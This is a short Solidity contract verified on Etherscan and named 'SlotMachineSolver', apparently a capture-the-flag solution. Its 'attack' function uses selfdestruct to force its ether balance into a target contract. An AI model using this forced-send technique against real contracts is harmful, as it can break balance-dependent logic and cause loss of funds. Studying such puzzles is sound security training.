/**
 *Submitted for verification at Etherscan.io on 2021-06-23
*/

pragma solidity 0.4.24;

contract SlotMachineSolver {
    constructor() public payable {
    }

    function attack(address t) public {
        selfdestruct(t);
    }
}